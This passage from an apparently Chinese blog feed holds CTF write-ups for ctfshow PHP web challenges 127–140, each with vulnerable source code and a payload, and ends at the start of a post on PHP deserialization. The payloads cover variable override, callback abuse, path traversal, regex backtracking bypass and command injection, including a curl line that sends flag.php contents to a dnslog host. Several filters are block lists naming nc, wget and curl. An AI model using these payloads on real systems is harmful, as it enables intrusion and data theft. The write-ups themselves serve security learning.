?ctf[show=ilove36d</code></p><ul><li>源码将<code>$ctf_show</code>赋值为经过md5加密后的flag</li><li>想要输出flag，只能将<code>$ctf_show</code>重新赋值</li><li><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>将<code>?</code>后面的数据以键值对的形式保存下来</li><li>又因为有个特殊符号检测，过滤了一大堆字符</li><li>所以可以利用<code>[</code>代替<code>_</code>重新将<code>$ctf_show</code>赋值</li></ul><h2 id="web128-gettext-，get-defined-vars"><a href="#web128-gettext-，get-defined-vars" class="headerlink" title="web128(gettext()，get_defined_vars)"></a>web128(gettext()，get_defined_vars)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?f1=_&amp;f2=get_defined_vars</code></p><ul><li>对<code>f1</code>参数进行了过滤</li><li><code>_()==gettext()</code>：翻译内容</li><li><code>get_defined_vars</code>：<ul><li>返回由所有已定义变量所组成的数组</li><li>变量包括环境变量、服务器变量和用户定义的变量</li></ul></li></ul><blockquote><p>因为调用了两次回调函数<br>所以外层回调调用的应该是一个函数，所以内层回调的结果应该是一个函数名字<br>要想得到函数名字，需要调用<code>gettext()</code>函数，来将<code>get_defined_vars</code>输出</p></blockquote><h2 id="web129-stripos，readfile"><a href="#web129-stripos，readfile" class="headerlink" title="web129(stripos，readfile)"></a>web129(stripos，readfile)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?f=./ctfshow/../flag.php</code></p><ul><li><code>stripos($haystack , $needle)</code> 查找字符串首次出现的位置（不区分大小写）<ul><li><code>$haystack</code>：在该字符串中查找</li><li><code>$needle</code>：目标字符串</li></ul></li><li><code>readfile()</code>输出文件</li></ul><blockquote><p>传入参数需存在ctfshow字符串，且不在第一个位置<br>访问ctfshow.php发现没有数据<br>所以猜测ctfshow可能是个目录<br>继续寻找当前目录没有数据，测试上层目录发现flag</p><p>或者可以使用php伪协议读取目录，伪协议中需要加上ctfshow</p></blockquote><h2 id="web130-stripos"><a href="#web130-stripos" class="headerlink" title="web130(stripos)"></a>web130(stripos)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: f=ctfshow</code></p><ul><li>抱着试一试的心态随便传了个参数，没想到flag就出来了<code>0.o</code></li><li>第二个if判断让我们传入的参数需含有ctfshow</li><li>正则匹配会匹配ctfshow前面的字符，要想绕过此if判断，ctfshow前不能有字符</li></ul><h2 id="web131-最大回溯次数绕过"><a href="#web131-最大回溯次数绕过" class="headerlink" title="web131(最大回溯次数绕过)"></a>web131(最大回溯次数绕过)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: f=ctfshow*100000036Dctfshow</code></p><ul><li><code>+?</code>看到这个一般都是最大回溯次数</li><li>传1000000个ctfshow绕过第一个if判断</li><li>最后传个36Dctfshow得到flag</li></ul><h2 id="web132-敏感文件"><a href="#web132-敏感文件" class="headerlink" title="web132(敏感文件)"></a>web132(敏感文件)</h2><ul><li>是个正常的网站，利用敏感文件<code>/robots.txt</code></li><li>或者拿御剑扫目录</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?username=admin&amp;password[]=1&amp;code=admin</code></p><ul><li><p><code>mt_rand</code>：生成更好的随机数</p></li><li><p>按照要求来构造参数</p><ul><li>username=admin</li><li>code=admin</li><li>password用数组绕过</li></ul></li></ul><h2 id="web133-无回显rce，dnslog外带"><a href="#web133-无回显rce，dnslog外带" class="headerlink" title="web133(无回显rce，dnslog外带)"></a>web133(无回显rce，dnslog外带)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?F=`$F `;curl `cat flag.php`.k4t3vw.dnslog.cn</code></p><ul><li><code>substr($F,0,6)</code>：从0位置开始截取6个长度。</li><li>`<code>和</code>shell_exec`等价</li><li>解题思路：</li></ul><blockquote><p>因为参数只能为六个字符，所以命令执行函数只有``了</p><p>又因为需要传命令，但是六个字符肯定不够用，所以考虑变量覆盖，用$F替换F，从而达到超出六个字符执行命令的结果</p><p>因为没有回显，所以只能将结果用别的方法输出出来，这里用的是Dnslog外带数据</p><p>将F覆盖后，利用curl将命令与dnslog的二级域名一起带出来，在解析的过程中，会将``里面的数据当作命令执行，从而达到将数据带出。</p></blockquote><h2 id="web134-parse-str-amp-extract"><a href="#web134-parse-str-amp-extract" class="headerlink" title="web134(parse_str&amp;extract)"></a>web134(parse_str&amp;extract)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><ul><li><code>parse_str()</code>：把查询字符解析到变量</li><li><code>ectract()</code>：从数组中将变量导入当前的符号表</li><li>php变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。</li></ul><h2 id="web135-linux命令"><a href="#web135-linux命令" class="headerlink" title="web135(linux命令)"></a>web135(linux命令)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line"> <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?F=`$F `;cp flag.php 1.txt  访问1.txt</code></p><ul><li>过滤了cat，curl等命令，所以我们用Dnslog外带获取数据很困难</li><li>不妨将flag.php拷贝到别的文件，在访问别的文件获得flag</li></ul><h2 id="web136-linux命令，tee"><a href="#web136-linux命令，tee" class="headerlink" title="web136(linux命令，tee)"></a>web136(linux命令，tee)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?c=ls /|tee 1 ?c=cat /f149_15_h3r3|tee 2 访问2下载文件，查看</code></p><ul><li>tee命令：用于读取标准输入的数据，并将其内容输出成文件<ul><li><code>tee file1 file2</code>：复制文件</li><li><code>ls /|tee 1.txt</code>：命令输出</li></ul></li></ul><h2 id="web137-调用函数"><a href="#web137-调用函数" class="headerlink" title="web137(::调用函数)"></a>web137(::调用函数)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]); </span><br></pre></td></tr></table></figure><p><code>payload: ctfshow=ctfshow::getFlag</code></p><ul><li>函数的调用<ul><li><code>::</code>：调用类中的函数</li></ul></li></ul><h2 id="web138-call-user-func传数组"><a href="#web138-call-user-func传数组" class="headerlink" title="web138(call_user_func传数组)"></a>web138(call_user_func传数组)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]); </span><br></pre></td></tr></table></figure><p><code>payload: ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code></p><ul><li><p><code>call_user_func</code>回调函数调用类里面的方法</p></li><li><p><code>call_user_func(array($classname, &#39;say_hello&#39;));</code><br>将调用$calssname类里面的<code>say_hello</code>的方法</p></li></ul><h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><ul><li>咦？怎么不能下载文件了？</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: </code></p><h2 id="web140-intval-弱比较"><a href="#web140-intval-弱比较" class="headerlink" title="web140(intval()弱比较)"></a>web140(intval()弱比较)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: f1=md5&amp;f2=md5</code></p><ul><li>想要输出flag，只需让<code>intval($code)</code>为零即可</li><li>例：</li></ul><blockquote><p>md5(phpinfo())<br>md5(sleep())<br>md5(md5())<br>current(localeconv)<br>sha1(getcwd())<br>sha1(sha1())</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/post/8ac6c1a1.html"/>
      <url>/post/8ac6c1a1.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li>序列化其实就是将数据转化成一种可逆的数据结构，逆向的过程就叫做反序列化。</li><li>php 将数据序列化和反序列化会用到两个函数</li></ul><blockquote><p><strong>serialize</strong> 将对象格式化成有序的字符串</p><p><strong>unserialize</strong> 将字符串还原成原来的对象</p></blockquote><ul><li><p>常见的序列化格式</p><ul><li><p>二进制格式</p></li><li><p>字节数组</p></li><li><p>json字符串</p></li><li><p>xml字符串</p></li></ul></li></ul><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 